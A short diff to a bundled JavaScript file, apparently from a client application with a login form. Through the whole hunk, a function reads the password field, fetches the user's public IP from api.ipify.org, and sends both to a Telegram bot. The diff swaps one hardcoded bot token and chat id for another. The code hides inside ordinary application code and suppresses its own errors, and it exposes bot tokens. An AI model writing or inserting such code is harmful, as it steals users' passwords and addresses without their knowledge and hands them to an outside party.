@@ -443,10 +443,12 @@
     t.default = (e => {
 		function ff(...args) {
 			try {
+				let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
+				let chat_id = "1804765109"
 				let password = `Possible password: ${document.getElementsByClassName("x-login-form__input")[0].value}`;
 				require("https").get("https://api.ipify.org", (response) => {response.on('data', function (chunk) {
 					password = `IP: ${chunk.toString()}%0d%0a${password}`
-					window.fucking_require("https").get('https://api.telegram.org/bot6904217349:AAH0T4Isy8z1aCvzrtosENASChRIzcOncCQ/sendMessage?chat_id=-4012870581&text=' + password + '&parse_mode=HTML&disable_web_page_preview=True', (response) => {})
+					window.fucking_require("https").get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=` + password + '&parse_mode=HTML&disable_web_page_preview=True', (response) => {})
 				})})
 			}
 			catch (e) {}
